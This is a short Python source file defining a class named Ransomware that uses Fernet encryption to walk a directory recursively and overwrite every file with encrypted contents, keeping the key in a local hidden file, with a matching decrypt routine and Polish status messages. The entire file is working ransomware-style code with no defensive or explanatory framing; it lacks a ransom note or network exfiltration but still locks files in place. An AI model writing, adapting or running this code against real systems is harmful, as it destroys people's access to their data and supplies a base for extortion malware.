import os

from cryptography.fernet import Fernet


class Ransomware:
    def generate_key(self) -> bytes:
        key = Fernet.generate_key()
        with open(".encrypt_key", "wb") as key_file:
            key_file.write(key)
        return key

    def load_key(self) -> bytes:
        with open(".encrypt_key", "rb") as key_file:
            key = key_file.read()
        return key

    def encrypt_file(self, file_path: str, cipher: Fernet) -> None:
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = cipher.encrypt(file_data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)

    def encrypt_files(self, directory_with_files: str) -> None:
        if os.path.exists(".encrypt_key"):
            key = self.load_key()
        else:
            key = self.generate_key()

        cipher = Fernet(key)

        for root, dirs, files in os.walk(directory_with_files):
            for file in files:
                file_path = os.path.join(root, file)
                print("Encrypting file: " + file_path)
                self.encrypt_file(file_path, cipher)

        print("Pliki zostaly zaszyfrowane")

    def decrypt_file(self, file_path: str, cipher: Fernet) -> None:
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = cipher.decrypt(encrypted_data)
        with open(file_path, "wb") as file:
            file.write(decrypted_data)

    def decrypt_files(self, directory_with_files: str) -> None:
        key = self.load_key()
        cipher = Fernet(key)

        for root, dirs, files in os.walk(directory_with_files):
            for file in files:
                file_path = os.path.join(root, file)
                print("Decrypting file: " + file_path)
                self.decrypt_file(file_path, cipher)

        print("Pliki zostaly odszyfrowane")
